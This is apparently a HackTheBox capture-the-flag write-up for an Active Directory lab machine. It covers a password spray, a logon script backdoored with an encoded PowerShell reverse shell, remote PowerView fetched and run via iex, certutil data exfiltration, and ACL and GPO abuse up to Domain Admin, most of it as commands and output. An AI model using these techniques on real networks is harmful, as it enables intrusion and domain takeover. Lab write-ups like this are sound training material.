HackTheBox: BabyTwo

2026-10-02 · 11 min read

BabyTwo is an Active Directory box (baby2.vl). A guest-readable share leaks a user list, a username-equals-password spray gets a foothold, a writable SYSVOL logon script is weaponised to catch a real user, and a BloodHound-guided ACL → GPO abuse chain reaches Domain Admin.

Reconnaissance

nmap -Pn 10.129.2.55 -p53,88,135,139,389,445,464,593,636,3268,3269,3389 -sCV

88/tcp  kerberos-sec   (domain: baby2.vl, dc.baby2.vl)
389/tcp ldap           Microsoft Windows Active Directory LDAP
445/tcp microsoft-ds
3389/tcp ms-wbt-server  DNS_Computer_Name: dc.baby2.vl

SMB enumeration & a user=password spray

The guest account can enumerate shares; homes is readable and holds per-user folders:

netexec smb 10.129.2.55 -u guest -p '' --shares
  apps     READ
  homes    READ,WRITE
  ...

smbclient //10.129.2.55/homes -U guest
  Amelia.Griffiths  Carl.Moore  Harry.Shaw  Joan.Jennings
  Joel.Hurst  Kieran.Mitchell  library  Lynda.Bailey
  Mohammed.Harris  Nicola.Lamb  Ryan.Jenkins

Those folder names are a user list. Spraying username as password finds two hits:

nxc smb 10.129.2.55 -u bab2users.txt -p bab2users.txt --no-bruteforce --continue-on-success
[+] baby2.vl\Carl.Moore:Carl.Moore
[+] baby2.vl\library:library

Writable SYSVOL logon script

Carl.Moore has write access to SYSVOL, where a domain logon script lives:

smbclient -U 'Carl.Moore%Carl.Moore' //baby2.vl/SYSVOL
  \baby2.vl\scripts\login.vbs

The script maps network drives for every user who logs on. Appending a line that runs a base64-encoded PowerShell reverse shell turns it into a trap, then re-upload it:

CreateObject("WScript.Shell").Run "powershell -e JABjAGwAaQBl...<reverse shell>...", 0, True
MapNetworkShare "\\dc.baby2.vl\apps", "V"
MapNetworkShare "\\dc.baby2.vl\docs", "L"
smb: \baby2.vl\scripts\> del login.vbs
smb: \baby2.vl\scripts\> put login.vbs

When a user logs on, the script fires and a shell returns — here as amelia.griffiths:

nc -lvnp 9001
connect to [10.10.14.138] from 10.129.2.55
whoami
baby2\amelia.griffiths

BloodHound → ACL & GPO abuse

SharpHound is staged and run from the shell, then the data is exfiltrated by base64-encoding the zip with certutil and decoding it locally:

Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\sharp.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp

certutil -encode C:\temp\...BloodHound.zip bh.txt   # -> transfer -> base64 -d

Amelia can grant herself rights over gpoadm, then reset its password:

iex (iwr -usebasicparsing http://10.10.14.31:5555/PowerView.ps1)
add-domainobjectacl -rights all -targetidentity gpoadm -principalidentity Amelia.Griffiths
$cred = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
set-domainuserpassword gpoadm -accountpassword $cred

gpoadm can edit a GPO, so pyGPOAbuse is used to add it to the local Administrators group on the DC:

python3 pygpoabuse.py baby2.vl/GPOADM:Password123! \
  -gpo-id 31B2F340-016D-11D2-945F-00C04FB984F9 \
  -command 'net localgroup administrators GPOADM /add' -f

[+] ScheduledTask created!
gpupdate /force      # (triggers the task)
nxc smb dc.baby2.vl -u gpoadm -p 'Password123!'
[+] baby2.vl\gpoadm:Password123! (Pwn3d!)

With local admin on the DC, WinRM in and read the root flag:

evil-winrm -i dc.baby2.vl -u GPOADM -p 'Password123!'
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
Three independent misconfigurations stack here: a guest-readable user list, username=password accounts, and a writable logon script — any one closed would have broken the chain well before the GPO abuse.
